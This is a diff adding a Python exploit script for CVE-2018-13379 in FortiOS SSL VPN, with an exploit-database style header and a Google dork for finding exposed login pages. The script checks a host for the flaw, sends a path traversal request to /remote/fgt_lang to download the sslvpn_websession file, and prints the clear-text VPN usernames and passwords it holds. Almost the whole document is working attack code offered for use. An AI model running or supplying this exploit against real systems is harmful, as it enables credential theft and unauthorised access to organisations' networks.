@@ -1,0 +1,96 @@
+# Exploit Title: FortiOS Leak file - Reading login/passwords in clear text.
+# Google Dork: intext:"Please Login" inurl:"/remote/login"
+# Date: 17/08/2019
+# Exploit Author: Carlos E. Vieira
+# Vendor Homepage: https://www.fortinet.com/
+# Software Link: https://www.fortinet.com/products/fortigate/fortios.html
+# Version: This vulnerability affect ( FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4 ).
+# Tested on: 5.6.6
+# CVE : CVE-2018-13379
+
+# Exploit SSLVPN Fortinet - FortiOs
+#!/usr/bin/env python
+import requests, sys, time
+import urllib3
+urllib3.disable_warnings()
+
+
+def leak(host, port):
+	print("[!] Leak information...")
+	try:
+		url = "https://"+host+":"+port+"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
+		headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}		
+		r=requests.get(url, headers=headers, verify=False, stream=True)
+		img=r.raw.read()
+		if "var fgt_lang =" in str(img):
+			with open("sslvpn_websession_"+host+".dat", 'w') as f:
+				f.write(img)		
+			print("[>] Save to file ....")
+			parse(host)
+			print("\n")
+			return True
+		else:
+			return False
+	except requests.exceptions.ConnectionError:
+		return False
+def is_character_printable(s):
+	return all((ord(c) < 127) and (ord(c) >= 32) for c in s)
+
+def is_printable(byte):
+	if is_character_printable(byte):
+    		return byte
+  	else:
+    		return '.' 
+
+def read_bytes(host, chunksize=8192):
+	print("[>] Read bytes from > " + "sslvpn_websession"+host+".dat")
+	with open("sslvpn_websession_"+host+".dat", "rb") as f:
+    		while True:
+        		chunk = f.read(chunksize)
+        		if chunk:
+          			for b in chunk:
+            				yield b
+        		else:
+          			break
+def parse(host):
+    print("[!] Parsing Information...")
+    memory_address = 0
+    ascii_string = ""
+    for byte in read_bytes(host):
+    	ascii_string = ascii_string + is_printable(byte)
+	if memory_address%61 == 60:
+		if ascii_string!=".............................................................":
+	    		print ascii_string
+	    	ascii_string = ""
+	memory_address = memory_address + 1
+
+def check(host, port):
+    print("[!] Check vuln...")
+    uri = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
+    try:
+        r = requests.get("https://" + host + ":" + port + uri, verify=False)
+        if(r.status_code == 200):
+            return True
+        elif(r.status_code == 404):
+            return False
+        else:
+            return False
+    except:
+        return False
+def main(host, port):
+    print("[+] Start exploiting....")
+    vuln = check(host, port)
+    if(vuln):
+        print("[+] Target is vulnerable!")
+        bin_file = leak(host, port)
+    else:
+        print("[X] Target not vulnerable.")
+
+if __name__ == "__main__":
+
+    if(len(sys.argv) < 3):
+        print("Use: python {} ip/dns port".format(sys.argv[0]))
+    else:
+        host = sys.argv[1]
+        port = sys.argv[2]
+        main(host, port)
